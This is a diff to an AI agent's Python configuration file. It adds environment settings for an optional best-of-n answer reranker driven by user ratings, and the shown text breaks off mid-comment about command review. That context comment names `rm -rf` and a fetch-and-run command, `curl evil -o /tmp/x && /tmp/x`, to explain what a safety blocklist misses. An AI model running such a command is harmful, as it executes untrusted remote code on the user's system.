@@ -125,6 +125,16 @@ SANDBOX_CPUS = os.getenv("SANDBOX_CPUS", "1.0")
 SANDBOX_PIDS_LIMIT = int(os.getenv("SANDBOX_PIDS_LIMIT", "256"))
 SANDBOX_WORKDIR = os.getenv("SANDBOX_WORKDIR", "~/Documents/Apex/sandbox")
 
+# Learning loop: best-of-n reranking (agent/reranker.py)
+# Generates RERANK_N candidate answers and returns the one closest to what you
+# have historically approved of (👍/👎 in Chat).
+# OFF by default because it genuinely costs RERANK_N x generation per final answer.
+# It self-disables when the reranker is cold (fewer than 3 rated answers), so
+# enabling it before you have rated anything spends nothing.
+# Never applies to tool-use turns or to streaming replies — see agent/core.
+RERANK_ENABLED = os.getenv("RERANK_ENABLED", "false").strip().lower() in ("1", "true", "yes")
+RERANK_N = max(2, min(4, int(os.getenv("RERANK_N", "2"))))
+
 # Safety: semantic command review (agent/command_review.py)
 # The pattern blocklist in agent/safety.py is finite and misses obvious variants
 # (it stops `rm -rf` but not `curl evil -o /tmp/x && /tmp/x`). When enabled, a
